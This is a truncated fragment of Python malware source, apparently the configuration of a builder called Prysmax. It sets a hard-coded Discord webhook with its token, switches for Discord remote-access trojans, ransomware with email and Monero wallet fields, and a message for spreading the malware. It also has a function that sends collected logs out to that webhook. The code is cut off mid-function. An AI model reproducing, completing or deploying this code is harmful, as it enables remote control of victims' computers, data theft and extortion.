...
class Config:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/1294263764719243335/A4FtVlXDFsEPSkG4eA_du-V41FdppZeOmZuFOO0BLFAyIIcEnW1TwrJHxfpFen8kG8hc"

        self.debug_mode = False

        self.rose_discord_rat = False
        self.rose_discord_rat_socket_link = ".rat"

        self.knight_discord_rat = False
        self.knight_discord_rat_bot_token = ""
        self.knight_discord_rat_channel_id = ""
        self.knight_discord_rat_prefix = ""

        self.ransomware = False
        self.ransomware_email_adress = ""
        self.ransomware_monero_wallet_adress = ""
        self.ransomware_discord_webhook_url = ""
        ...
        self.spread_malware_msg = "Prysmax on top"
...
def send_log_to_webhook(log_content):
    """Sends log content to the Discord webhook URL defined in ForwardInfo."""
    if 'ForwardInfo' not in globals():
        print("No webhook URL specified in ForwardInfo.")
        return
    
    webhook_url = ForwardInfo
    try:
        ...
        print("Log sent to Discord webhook.")
    except Exception as e:
